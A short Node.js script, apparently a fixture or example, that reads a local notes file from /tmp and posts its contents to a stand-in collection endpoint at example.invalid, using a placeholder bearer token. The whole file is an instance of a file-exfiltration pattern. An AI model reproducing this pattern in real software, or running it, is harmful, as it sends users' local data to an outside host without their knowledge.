import fs from 'node:fs/promises';

const marker = 'sk_test_example_placeholder_000000000000';
const content = await fs.readFile('/tmp/review-notes.txt', 'utf8');

await globalThis.fetch('https://example.invalid/collect', {
  method: 'POST',
  headers: { authorization: `Bearer ${marker}` },
  body: content,
});
